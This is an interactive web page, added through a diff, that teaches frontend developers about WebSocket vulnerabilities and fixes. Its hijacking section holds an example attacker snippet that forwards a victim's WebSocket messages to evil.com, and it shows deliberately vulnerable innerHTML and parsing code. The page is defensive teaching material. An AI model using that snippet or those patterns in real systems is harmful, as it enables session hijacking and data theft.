@@ -1,0 +1,997 @@
+<title>WebSocket Vulnerabilities</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+:root {
+  --bg: #f5f3ef;
+  --surface: #eae7e1;
+  --surface-raised: #fff;
+  --text: #1e2329;
+  --text-muted: #5e6570;
+  --accent: #1a8a7a;
+  --accent-dim: rgba(26,138,122,0.12);
+  --danger: #c74b50;
+  --danger-dim: rgba(199,75,80,0.10);
+  --warning: #b08a1e;
+  --warning-dim: rgba(176,138,30,0.10);
+  --safe: #2d8a4e;
+  --safe-dim: rgba(45,138,78,0.10);
+  --border: rgba(30,35,41,0.10);
+  --code-bg: #e4e1db;
+  --node-client: #3b7dd8;
+  --node-server: #1a8a7a;
+  --node-attacker: #c74b50;
+  --node-cache: #b08a1e;
+  --font-body: 'IBM Plex Sans', system-ui, sans-serif;
+  --font-mono: 'IBM Plex Mono', monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0e1520;
+    --surface: #172030;
+    --surface-raised: #1e2a3a;
+    --text: #cdd5e0;
+    --text-muted: #6b7a8d;
+    --accent: #4ec9b0;
+    --accent-dim: rgba(78,201,176,0.12);
+    --danger: #e06c75;
+    --danger-dim: rgba(224,108,117,0.12);
+    --warning: #e5c07b;
+    --warning-dim: rgba(229,192,123,0.10);
+    --safe: #5cbf7a;
+    --safe-dim: rgba(92,191,122,0.10);
+    --border: rgba(205,213,224,0.08);
+    --code-bg: #131e2c;
+    --node-client: #5b9de8;
+    --node-server: #4ec9b0;
+    --node-attacker: #e06c75;
+    --node-cache: #e5c07b;
+    --font-body: 'IBM Plex Sans', system-ui, sans-serif;
+    --font-mono: 'IBM Plex Mono', monospace;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0e1520;
+  --surface: #172030;
+  --surface-raised: #1e2a3a;
+  --text: #cdd5e0;
+  --text-muted: #6b7a8d;
+  --accent: #4ec9b0;
+  --accent-dim: rgba(78,201,176,0.12);
+  --danger: #e06c75;
+  --danger-dim: rgba(224,108,117,0.12);
+  --warning: #e5c07b;
+  --warning-dim: rgba(229,192,123,0.10);
+  --safe: #5cbf7a;
+  --safe-dim: rgba(92,191,122,0.10);
+  --border: rgba(205,213,224,0.08);
+  --code-bg: #131e2c;
+  --node-client: #5b9de8;
+  --node-server: #4ec9b0;
+  --node-attacker: #e06c75;
+  --node-cache: #e5c07b;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-body);
+  font-size: 15px;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+}
+
+.container { max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+
+header { margin-bottom: 2.5rem; }
+header h1 {
+  font-size: 1.75rem;
+  font-weight: 700;
+  letter-spacing: -0.02em;
+  text-wrap: balance;
+  margin-bottom: 0.35rem;
+}
+header h1 span { color: var(--accent); }
+header p { color: var(--text-muted); font-size: 0.9rem; max-width: 55ch; }
+
+.protocol-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.25rem 1.5rem;
+  margin-bottom: 2.5rem;
+  display: flex;
+  gap: 2rem;
+  align-items: flex-start;
+  flex-wrap: wrap;
+}
+.protocol-box .col { flex: 1; min-width: 200px; }
+.protocol-box h3 {
+  font-size: 0.7rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--text-muted);
+  margin-bottom: 0.6rem;
+}
+.protocol-box code {
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  display: block;
+  line-height: 1.8;
+  color: var(--text);
+}
+.protocol-box .arrow { color: var(--text-muted); }
+.protocol-box .tag-safe {
+  display: inline-block;
+  background: var(--safe-dim);
+  color: var(--safe);
+  font-size: 0.7rem;
+  font-weight: 600;
+  padding: 0.1em 0.5em;
+  border-radius: 3px;
+  margin-left: 0.4em;
+  vertical-align: middle;
+  font-family: var(--font-mono);
+}
+.protocol-box .tag-danger {
+  display: inline-block;
+  background: var(--danger-dim);
+  color: var(--danger);
+  font-size: 0.7rem;
+  font-weight: 600;
+  padding: 0.1em 0.5em;
+  border-radius: 3px;
+  margin-left: 0.4em;
+  vertical-align: middle;
+  font-family: var(--font-mono);
+}
+
+.tabs {
+  display: flex;
+  gap: 0.25rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 0;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+}
+.tab {
+  font-family: var(--font-body);
+  font-size: 0.8rem;
+  font-weight: 500;
+  padding: 0.6rem 1rem;
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  white-space: nowrap;
+  border-bottom: 2px solid transparent;
+  transition: color 0.15s, border-color 0.15s;
+}
+.tab:hover { color: var(--text); }
+.tab:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; border-radius: 4px 4px 0 0; }
+.tab.active {
+  color: var(--accent);
+  border-bottom-color: var(--accent);
+  font-weight: 600;
+}
+
+.panel {
+  display: none;
+  padding: 1.5rem 0;
+  animation: fadeIn 0.2s ease;
+}
+.panel.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+
+.attack-card {
+  background: var(--surface-raised);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+}
+.attack-card__header {
+  padding: 1rem 1.25rem;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+.severity {
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  padding: 0.2em 0.6em;
+  border-radius: 3px;
+}
+.severity--high { background: var(--danger-dim); color: var(--danger); }
+.severity--medium { background: var(--warning-dim); color: var(--warning); }
+.attack-card__title { font-size: 1rem; font-weight: 600; }
+
+.diagram-area {
+  padding: 1.5rem;
+  min-height: 220px;
+  position: relative;
+}
+
+canvas.attack-diagram {
+  width: 100%;
+  height: 220px;
+  display: block;
+}
+
+.attack-card__body { padding: 0 1.25rem 1.25rem; }
+.attack-card__body h4 {
+  font-size: 0.72rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--text-muted);
+  margin-bottom: 0.5rem;
+}
+.attack-card__body p {
+  font-size: 0.88rem;
+  color: var(--text);
+  margin-bottom: 1rem;
+  max-width: 65ch;
+}
+.step-list {
+  list-style: none;
+  counter-reset: step;
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+  margin-bottom: 1.25rem;
+}
+.step-list li {
+  counter-increment: step;
+  display: flex;
+  align-items: flex-start;
+  gap: 0.6rem;
+  font-size: 0.85rem;
+  line-height: 1.5;
+}
+.step-list li::before {
+  content: counter(step);
+  flex-shrink: 0;
+  width: 1.4em;
+  height: 1.4em;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: var(--font-mono);
+  font-size: 0.7rem;
+  font-weight: 600;
+  background: var(--accent-dim);
+  color: var(--accent);
+  border-radius: 50%;
+  margin-top: 0.15em;
+}
+
+.fix-box {
+  background: var(--safe-dim);
+  border-left: 3px solid var(--safe);
+  padding: 0.8rem 1rem;
+  border-radius: 0 6px 6px 0;
+  margin-bottom: 0.75rem;
+}
+.fix-box h5 {
+  font-size: 0.72rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--safe);
+  margin-bottom: 0.3rem;
+}
+.fix-box code {
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  display: block;
+  white-space: pre-wrap;
+  word-break: break-word;
+  line-height: 1.7;
+  color: var(--text);
+}
+
+.danger-box {
+  background: var(--danger-dim);
+  border-left: 3px solid var(--danger);
+  padding: 0.8rem 1rem;
+  border-radius: 0 6px 6px 0;
+  margin-bottom: 0.75rem;
+}
+.danger-box h5 {
+  font-size: 0.72rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--danger);
+  margin-bottom: 0.3rem;
+}
+.danger-box code {
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  display: block;
+  white-space: pre-wrap;
+  word-break: break-word;
+  line-height: 1.7;
+  color: var(--text);
+}
+
+.checklist {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.25rem 1.5rem;
+  margin-top: 2rem;
+}
+.checklist h3 {
+  font-size: 1rem;
+  font-weight: 600;
+  margin-bottom: 0.75rem;
+}
+.checklist-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 0.4rem 2rem;
+}
+.checklist label {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.5rem;
+  font-size: 0.84rem;
+  line-height: 1.5;
+  cursor: pointer;
+  padding: 0.25rem 0;
+}
+.checklist input[type="checkbox"] {
+  margin-top: 0.25em;
+  accent-color: var(--accent);
+  flex-shrink: 0;
+}
+.checklist-section {
+  font-size: 0.68rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--text-muted);
+  margin-top: 0.75rem;
+  margin-bottom: 0.25rem;
+  grid-column: 1 / -1;
+}
+.checklist-section:first-child { margin-top: 0; }
+
+.play-btn {
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  font-weight: 500;
+  padding: 0.4em 1em;
+  background: var(--accent-dim);
+  color: var(--accent);
+  border: 1px solid var(--accent);
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background 0.15s;
+  margin-top: 0.5rem;
+}
+.play-btn:hover { background: var(--accent); color: var(--bg); }
+.play-btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+@media (max-width: 600px) {
+  .container { padding: 1.25rem 1rem 3rem; }
+  .protocol-box { flex-direction: column; gap: 1rem; }
+  .tabs { gap: 0; }
+  .tab { padding: 0.5rem 0.65rem; font-size: 0.72rem; }
+  canvas.attack-diagram { height: 180px; }
+}
+</style>
+
+<div class="container">
+  <header>
+    <h1>WebSocket <span>Vulnerabilities</span></h1>
+    <p>How real-time connections bypass HTTP's security model, and what a frontend developer can do about it.</p>
+  </header>
+
+  <div class="protocol-box">
+    <div class="col">
+      <h3>HTTP (request-response)</h3>
+      <code>
+        Client <span class="arrow">&rarr;</span> GET /api/data<br>
+        Server <span class="arrow">&rarr;</span> 200 OK + payload<br>
+        <em style="color:var(--text-muted);font-size:0.78rem">(connection closes)</em>
+      </code>
+    </div>
+    <div class="col">
+      <h3>WebSocket (persistent)</h3>
+      <code>
+        Client <span class="arrow">&rarr;</span> GET /chat <span class="tag-safe">Upgrade</span><br>
+        Server <span class="arrow">&rarr;</span> 101 Switching<br>
+        Client <span class="arrow">&harr;</span> Server <span class="tag-danger">cookies sent!</span>
+      </code>
+    </div>
+  </div>
+
+  <nav class="tabs" role="tablist" aria-label="Vulnerability types">
+    <button class="tab active" role="tab" data-panel="cswsh" aria-selected="true">Hijacking</button>
+    <button class="tab" role="tab" data-panel="xss" aria-selected="false">XSS via WS</button>
+    <button class="tab" role="tab" data-panel="transport" aria-selected="false">ws:// vs wss://</button>
+    <button class="tab" role="tab" data-panel="validation" aria-selected="false">No Validation</button>
+    <button class="tab" role="tab" data-panel="flooding" aria-selected="false">Flooding</button>
+  </nav>
+
+  <!-- CSWSH -->
+  <div class="panel active" id="panel-cswsh" role="tabpanel">
+    <div class="attack-card">
+      <div class="attack-card__header">
+        <span class="severity severity--high">High</span>
+        <span class="attack-card__title">Cross-Site WebSocket Hijacking</span>
+      </div>
+      <div class="diagram-area">
+        <canvas class="attack-diagram" id="diagram-cswsh"></canvas>
+        <button class="play-btn" data-diagram="cswsh">Replay attack</button>
+      </div>
+      <div class="attack-card__body">
+        <h4>How it works</h4>
+        <ol class="step-list">
+          <li>Victim is logged into your-app.com (has session cookie)</li>
+          <li>Victim visits evil.com (attacker's page)</li>
+          <li>evil.com runs <code style="font-family:var(--font-mono);font-size:0.82em;background:var(--code-bg);padding:0.1em 0.3em;border-radius:3px">new WebSocket('wss://your-app.com/chat')</code></li>
+          <li>Browser attaches victim's cookies to the upgrade request automatically</li>
+          <li>Server sees valid session &mdash; accepts connection</li>
+          <li>Attacker reads/writes messages as the victim</li>
+        </ol>
+        <h4>Why it works</h4>
+        <p>CORS doesn't apply to WebSocket connections. The browser sends cookies on the handshake just like any HTTP request, but there's no CSRF token mechanism built in.</p>
+        <div class="danger-box">
+          <h5>Attacker's code</h5>
+          <code>const ws = new WebSocket('wss://your-app.com/chat');
+ws.onmessage = e => fetch('https://evil.com/steal?d=' + e.data);</code>
+        </div>
+        <div class="fix-box">
+          <h5>Frontend fix &mdash; token-based auth</h5>
+          <code>const ws = new WebSocket('wss://your-app.com/chat');
+ws.onopen = () => ws.send(JSON.stringify({
+  type: 'auth', token: getCSRFToken()
+}));</code>
+        </div>
+        <div class="fix-box">
+          <h5>Server fix &mdash; check Origin header</h5>
+          <code>if (!['https://your-app.com'].includes(req.headers.origin))
+  req.destroy(); // reject cross-origin handshake</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- XSS -->
+  <div class="panel" id="panel-xss" role="tabpanel">
+    <div class="attack-card">
+      <div class="attack-card__header">
+        <span class="severity severity--high">High</span>
+        <span class="attack-card__title">XSS via WebSocket Messages</span>
+      </div>
+      <div class="diagram-area">
+        <canvas class="attack-diagram" id="diagram-xss"></canvas>
+        <button class="play-btn" data-diagram="xss">Replay attack</button>
+      </div>
+      <div class="attack-card__body">
+        <h4>How it works</h4>
+        <ol class="step-list">
+          <li>Attacker sends a crafted message through the WebSocket (e.g., in a chat app)</li>
+          <li>Server relays the message to all connected clients</li>
+          <li>Your frontend renders it with <code style="font-family:var(--font-mono);font-size:0.82em;background:var(--code-bg);padding:0.1em 0.3em;border-radius:3px">innerHTML</code></li>
+          <li>The payload executes in every connected user's browser</li>
+        </ol>
+        <div class="danger-box">
+          <h5>The vulnerable pattern</h5>
+          <code>ws.onmessage = (e) => {
+  const data = JSON.parse(e.data);
+  chatDiv.innerHTML += '&lt;p&gt;' + data.message + '&lt;/p&gt;'; // XSS!
+};</code>
+        </div>
+        <div class="fix-box">
+          <h5>Fix &mdash; use textContent</h5>
+          <code>const p = document.createElement('p');
+p.textContent = data.message; // safe: HTML is escaped
+chatDiv.appendChild(p);</code>
+        </div>
+        <div class="fix-box">
+          <h5>Fix &mdash; sanitize if rich content needed</h5>
+          <code>chatDiv.innerHTML += DOMPurify.sanitize(data.message);</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Transport -->
+  <div class="panel" id="panel-transport" role="tabpanel">
+    <div class="attack-card">
+      <div class="attack-card__header">
+        <span class="severity severity--high">High</span>
+        <span class="attack-card__title">Unencrypted Transport (ws://)</span>
+      </div>
+      <div class="diagram-area">
+        <canvas class="attack-diagram" id="diagram-transport"></canvas>
+        <button class="play-btn" data-diagram="transport">Replay attack</button>
+      </div>
+      <div class="attack-card__body">
+        <h4>How it works</h4>
+        <ol class="step-list">
+          <li>App connects with <code style="font-family:var(--font-mono);font-size:0.82em;background:var(--code-bg);padding:0.1em 0.3em;border-radius:3px">ws://</code> instead of <code style="font-family:var(--font-mono);font-size:0.82em;background:var(--code-bg);padding:0.1em 0.3em;border-radius:3px">wss://</code></li>
+          <li>All WebSocket frames travel unencrypted over the network</li>
+          <li>An attacker on the same network (coffee shop, hotel) reads and modifies every message</li>
+        </ol>
+        <div class="danger-box">
+          <h5>Insecure</h5>
+          <code>new WebSocket('ws://your-app.com/chat'); // plaintext!</code>
+        </div>
+        <div class="fix-box">
+          <h5>Fix &mdash; one character</h5>
+          <code>new WebSocket('wss://your-app.com/chat'); // TLS encrypted</code>
+        </div>
+        <p>If your site serves over HTTPS, browsers block <code style="font-family:var(--font-mono);font-size:0.82em;background:var(--code-bg);padding:0.1em 0.3em;border-radius:3px">ws://</code> as mixed content anyway. Always use <code style="font-family:var(--font-mono);font-size:0.82em;background:var(--code-bg);padding:0.1em 0.3em;border-radius:3px">wss://</code>.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Validation -->
+  <div class="panel" id="panel-validation" role="tabpanel">
+    <div class="attack-card">
+      <div class="attack-card__header">
+        <span class="severity severity--medium">Medium</span>
+        <span class="attack-card__title">No Input Validation</span>
+      </div>
+      <div class="diagram-area">
+        <canvas class="attack-diagram" id="diagram-validation"></canvas>
+        <button class="play-btn" data-diagram="validation">Replay attack</button>
+      </div>
+      <div class="attack-card__body">
+        <h4>How it works</h4>
+        <ol class="step-list">
+          <li>WebSocket is a raw pipe &mdash; no built-in schema, no content-type</li>
+          <li>Attacker sends malformed JSON, unexpected types, or oversized payloads</li>
+          <li>Your code crashes, misbehaves, or processes data it shouldn't</li>
+        </ol>
+        <div class="danger-box">
+          <h5>Vulnerable</h5>
+          <code>ws.onmessage = (e) => {
+  const data = JSON.parse(e.data); // throws on bad JSON
+  process(data.action); // no type check, no shape check
+};</code>
+        </div>
+        <div class="fix-box">
+          <h5>Fix &mdash; validate everything</h5>
+          <code>ws.onmessage = (e) => {
+  let data;
+  try { data = JSON.parse(e.data); } catch { return; }
+  if (typeof data.type !== 'string') return;
+  if (typeof data.message !== 'string') return;
+  if (data.message.length > 10000) return;
+  renderMessage(data);
+};</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Flooding -->
+  <div class="panel" id="panel-flooding" role="tabpanel">
+    <div class="attack-card">
+      <div class="attack-card__header">
+        <span class="severity severity--medium">Medium</span>
+        <span class="attack-card__title">Message Flooding / DoS</span>
+      </div>
+      <div class="diagram-area">
+        <canvas class="attack-diagram" id="diagram-flooding"></canvas>
+        <button class="play-btn" data-diagram="flooding">Replay attack</button>
+      </div>
+      <div class="attack-card__body">
+        <h4>How it works</h4>
+        <ol class="step-list">
+          <li>WebSocket has no built-in rate limiting</li>
+          <li>A malicious or buggy client blasts thousands of messages per second</li>
+          <li>Server overwhelmed, other users lag or disconnect; your UI freezes</li>
+        </ol>
+        <div class="fix-box">
+          <h5>Client-side rate limiter</h5>
+          <code>let count = 0;
+const MAX_PER_SEC = 50;
+setInterval(() => { count = 0; }, 1000);
+
+ws.onmessage = (e) => {
+  if (++count > MAX_PER_SEC) return; // drop excess
+  handleMessage(e.data);
+};</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="checklist">
+    <h3>Frontend Security Checklist</h3>
+    <div class="checklist-grid">
+      <div class="checklist-section">Connection</div>
+      <label><input type="checkbox"> Always use <strong>wss://</strong>, never ws://</label>
+      <label><input type="checkbox"> Send auth token after connect, don't rely on cookies alone</label>
+      <label><input type="checkbox"> Reconnect with exponential backoff</label>
+
+      <div class="checklist-section">Receiving</div>
+      <label><input type="checkbox"> Parse JSON inside try/catch</label>
+      <label><input type="checkbox"> Validate message shape and types</label>
+      <label><input type="checkbox"> Never use <strong>innerHTML</strong> with WS data</label>
+      <label><input type="checkbox"> Cap message size and rate on the client</label>
+
+      <div class="checklist-section">Sending</div>
+      <label><input type="checkbox"> Sanitize user input before sending</label>
+      <label><input type="checkbox"> Don't send passwords/tokens in WS payload</label>
+
+      <div class="checklist-section">Lifecycle</div>
+      <label><input type="checkbox"> Close WebSocket on logout / page unload</label>
+      <label><input type="checkbox"> Handle disconnections gracefully</label>
+    </div>
+  </div>
+</div>
+
+<script>
+// Tabs
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => { t.classList.remove('active'); t.setAttribute('aria-selected', 'false'); });
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    tab.classList.add('active');
+    tab.setAttribute('aria-selected', 'true');
+    document.getElementById('panel-' + tab.dataset.panel).classList.add('active');
+    initDiagram(tab.dataset.panel);
+  });
+});
+
+// Diagram system
+const diagrams = {};
+const animations = {};
+
+function getColors() {
+  const s = getComputedStyle(document.documentElement);
+  return {
+    client: s.getPropertyValue('--node-client').trim(),
+    server: s.getPropertyValue('--node-server').trim(),
+    attacker: s.getPropertyValue('--node-attacker').trim(),
+    text: s.getPropertyValue('--text').trim(),
+    muted: s.getPropertyValue('--text-muted').trim(),
+    bg: s.getPropertyValue('--bg').trim(),
+    surface: s.getPropertyValue('--surface').trim(),
+    accent: s.getPropertyValue('--accent').trim(),
+    danger: s.getPropertyValue('--danger').trim(),
+    safe: s.getPropertyValue('--safe').trim(),
+    warning: s.getPropertyValue('--warning').trim(),
+  };
+}
+
+function setupCanvas(id) {
+  const canvas = document.getElementById(id);
+  if (!canvas) return null;
+  const dpr = window.devicePixelRatio || 1;
+  const rect = canvas.getBoundingClientRect();
+  canvas.width = rect.width * dpr;
+  canvas.height = rect.height * dpr;
+  const ctx = canvas.getContext('2d');
+  ctx.scale(dpr, dpr);
+  return { canvas, ctx, w: rect.width, h: rect.height };
+}
+
+function drawNode(ctx, x, y, label, color, radius) {
+  radius = radius || 28;
+  ctx.beginPath();
+  ctx.arc(x, y, radius, 0, Math.PI * 2);
+  ctx.fillStyle = color + '22';
+  ctx.fill();
+  ctx.lineWidth = 2;
+  ctx.strokeStyle = color;
+  ctx.stroke();
+  ctx.fillStyle = color;
+  ctx.font = '600 11px IBM Plex Sans, system-ui';
+  ctx.textAlign = 'center';
+  ctx.textBaseline = 'top';
+  ctx.fillText(label, x, y + radius + 6);
+}
+
+function drawArrow(ctx, x1, y1, x2, y2, color, progress, dashed, label) {
+  if (progress <= 0) return;
+  const dx = x2 - x1, dy = y2 - y1;
+  const ex = x1 + dx * Math.min(progress, 1);
+  const ey = y1 + dy * Math.min(progress, 1);
+  ctx.beginPath();
+  if (dashed) ctx.setLineDash([4, 4]);
+  else ctx.setLineDash([]);
+  ctx.moveTo(x1, y1);
+  ctx.lineTo(ex, ey);
+  ctx.strokeStyle = color;
+  ctx.lineWidth = 2;
+  ctx.stroke();
+  ctx.setLineDash([]);
+  if (progress >= 1) {
+    const angle = Math.atan2(dy, dx);
+    ctx.beginPath();
+    ctx.moveTo(ex, ey);
+    ctx.lineTo(ex - 8 * Math.cos(angle - 0.4), ey - 8 * Math.sin(angle - 0.4));
+    ctx.lineTo(ex - 8 * Math.cos(angle + 0.4), ey - 8 * Math.sin(angle + 0.4));
+    ctx.closePath();
+    ctx.fillStyle = color;
+    ctx.fill();
+  }
+  if (label && progress >= 0.5) {
+    const mx = (x1 + x2) / 2, my = (y1 + y2) / 2 - 10;
+    ctx.font = '500 10px IBM Plex Mono, monospace';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'bottom';
+    ctx.fillStyle = color;
+    ctx.globalAlpha = Math.min((progress - 0.5) * 4, 1);
+    ctx.fillText(label, mx, my);
+    ctx.globalAlpha = 1;
+  }
+}
+
+function drawPacket(ctx, x1, y1, x2, y2, progress, color) {
+  if (progress <= 0 || progress >= 1) return;
+  const px = x1 + (x2 - x1) * progress;
+  const py = y1 + (y2 - y1) * progress;
+  ctx.beginPath();
+  ctx.arc(px, py, 4, 0, Math.PI * 2);
+  ctx.fillStyle = color;
+  ctx.fill();
+  ctx.beginPath();
+  ctx.arc(px, py, 8, 0, Math.PI * 2);
+  ctx.fillStyle = color + '44';
+  ctx.fill();
+}
+
+// CSWSH diagram
+function drawCSWSH(setup, t) {
+  const { ctx, w, h } = setup;
+  const c = getColors();
+  ctx.clearRect(0, 0, w, h);
+
+  const cx = w * 0.15, cy = h * 0.4;
+  const sx = w * 0.85, sy = h * 0.4;
+  const ax = w * 0.15, ay = h * 0.85;
+
+  drawNode(ctx, cx, cy, 'Victim', c.client);
+  drawNode(ctx, sx, sy, 'Server', c.server);
+  drawNode(ctx, ax, ay, 'evil.com', c.attacker);
+
+  // Phase 1: victim logged in
+  if (t > 0) drawArrow(ctx, cx + 30, cy, sx - 30, sy, c.safe, Math.min(t / 0.15, 1), false, 'logged in (cookie)');
+  // Phase 2: attacker opens WS
+  if (t > 0.25) drawArrow(ctx, ax + 30, ay - 10, sx - 30, sy + 10, c.danger, Math.min((t - 0.25) / 0.2, 1), true, 'new WebSocket() + victim cookie');
+  // Phase 3: server accepts
+  if (t > 0.55) drawArrow(ctx, sx - 30, sy + 14, ax + 30, ay - 6, c.danger, Math.min((t - 0.55) / 0.2, 1), false, '101 accepted!');
+  // Phase 4: data stolen
+  if (t > 0.8) {
+    drawPacket(ctx, sx - 30, sy + 14, ax + 30, ay - 6, ((t - 0.8) / 0.2) % 1, c.danger);
+    ctx.font = '600 12px IBM Plex Sans, system-ui';
+    ctx.textAlign = 'center';
+    ctx.fillStyle = c.danger;
+    ctx.globalAlpha = Math.min((t - 0.85) * 6, 1);
+    ctx.fillText('Data stolen!', w * 0.5, h * 0.12);
+    ctx.globalAlpha = 1;
+  }
+}
+
+// XSS diagram
+function drawXSS(setup, t) {
+  const { ctx, w, h } = setup;
+  const c = getColors();
+  ctx.clearRect(0, 0, w, h);
+
+  const ax = w * 0.1, ay = h * 0.5;
+  const sx = w * 0.5, sy = h * 0.5;
+  const u1x = w * 0.9, u1y = h * 0.25;
+  const u2x = w * 0.9, u2y = h * 0.75;
+
+  drawNode(ctx, ax, ay, 'Attacker', c.attacker);
+  drawNode(ctx, sx, sy, 'Server', c.server);
+  drawNode(ctx, u1x, u1y, 'User A', c.client);
+  drawNode(ctx, u2x, u2y, 'User B', c.client);
+
+  if (t > 0) drawArrow(ctx, ax + 30, ay, sx - 30, sy, c.danger, Math.min(t / 0.2, 1), false, '<img onerror=...>');
+  if (t > 0.3) {
+    drawArrow(ctx, sx + 30, sy - 10, u1x - 30, u1y + 10, c.danger, Math.min((t - 0.3) / 0.2, 1), false, 'broadcast');
+    drawArrow(ctx, sx + 30, sy + 10, u2x - 30, u2y - 10, c.danger, Math.min((t - 0.3) / 0.2, 1), false, '');
+  }
+  if (t > 0.6) {
+    ctx.font = '600 11px IBM Plex Mono, monospace';
+    ctx.textAlign = 'center';
+    ctx.fillStyle = c.danger;
+    ctx.globalAlpha = Math.min((t - 0.6) * 4, 1);
+    ctx.fillText('XSS executes in all browsers', w * 0.5, h * 0.08);
+    ctx.globalAlpha = 1;
+  }
+}
+
+// Transport diagram
+function drawTransport(setup, t) {
+  const { ctx, w, h } = setup;
+  const c = getColors();
+  ctx.clearRect(0, 0, w, h);
+
+  const cx = w * 0.15, sy = h * 0.3;
+  const sx = w * 0.85;
+  const by = h * 0.72;
+
+  drawNode(ctx, cx, sy, 'Client', c.client);
+  drawNode(ctx, sx, sy, 'Server', c.server);
+
+  // ws:// line
+  ctx.font = '500 10px IBM Plex Mono, monospace';
+  ctx.textAlign = 'left';
+  ctx.fillStyle = c.danger;
+  ctx.fillText('ws://', cx + 40, sy - 20);
+  if (t > 0) drawArrow(ctx, cx + 30, sy, sx - 30, sy, c.danger, Math.min(t / 0.2, 1), true, 'plaintext frames');
+
+  // Attacker in the middle
+  if (t > 0.25) {
+    const mx = w * 0.5, my = sy;
+    ctx.globalAlpha = Math.min((t - 0.25) * 4, 1);
+    drawNode(ctx, mx, my + 55, 'Eavesdropper', c.attacker, 22);
+    ctx.beginPath();
+    ctx.moveTo(mx, my + 30);
+    ctx.lineTo(mx, my + 5);
+    ctx.strokeStyle = c.attacker;
+    ctx.lineWidth = 1.5;
+    ctx.setLineDash([3, 3]);
+    ctx.stroke();
+    ctx.setLineDash([]);
+    ctx.globalAlpha = 1;
+  }
+
+  // wss:// line
+  drawNode(ctx, cx, by, 'Client', c.client);
+  drawNode(ctx, sx, by, 'Server', c.server);
+  ctx.fillStyle = c.safe;
+  ctx.fillText('wss://', cx + 40, by - 20);
+  if (t > 0.5) {
+    drawArrow(ctx, cx + 30, by, sx - 30, by, c.safe, Math.min((t - 0.5) / 0.2, 1), false, 'TLS encrypted');
+    if (t > 0.75) {
+      ctx.font = '600 11px IBM Plex Sans, system-ui';
+      ctx.textAlign = 'center';
+      ctx.fillStyle = c.safe;
+      ctx.globalAlpha = Math.min((t - 0.75) * 4, 1);
+      ctx.fillText('Attacker sees only gibberish', w * 0.5, by + 48);
+      ctx.globalAlpha = 1;
+    }
+  }
+}
+
+// Validation diagram
+function drawValidation(setup, t) {
+  const { ctx, w, h } = setup;
+  const c = getColors();
+  ctx.clearRect(0, 0, w, h);
+
+  const ax = w * 0.12, ay = h * 0.5;
+  const sx = w * 0.88, sy = h * 0.5;
+
+  drawNode(ctx, ax, ay, 'Attacker', c.attacker);
+  drawNode(ctx, sx, sy, 'Your App', c.client);
+
+  const msgs = [
+    { text: '{"type":"admin","action":"deleteAll"}', y: -25, delay: 0 },
+    { text: 'not even JSON %%%', y: 0, delay: 0.2 },
+    { text: '{"msg":"' + 'A'.repeat(20) + '...x999999"}', y: 25, delay: 0.4 },
+  ];
+  msgs.forEach(m => {
+    if (t > m.delay) {
+      const p = Math.min((t - m.delay) / 0.25, 1);
+      drawArrow(ctx, ax + 30, ay + m.y, sx - 30, sy + m.y, c.danger, p, false, '');
+      drawPacket(ctx, ax + 30, ay + m.y, sx - 30, sy + m.y, p * 0.8, c.danger);
+      if (p >= 1) {
+        ctx.font = '500 9px IBM Plex Mono, monospace';
+        ctx.textAlign = 'center';
+        ctx.fillStyle = c.danger;
+        const lx = (ax + sx) / 2;
+        ctx.fillText(m.text.substring(0, 40), lx, ay + m.y - 8);
+      }
+    }
+  });
+
+  if (t > 0.75) {
+    ctx.font = '600 12px IBM Plex Sans, system-ui';
+    ctx.textAlign = 'center';
+    ctx.fillStyle = c.warning;
+    ctx.globalAlpha = Math.min((t - 0.75) * 4, 1);
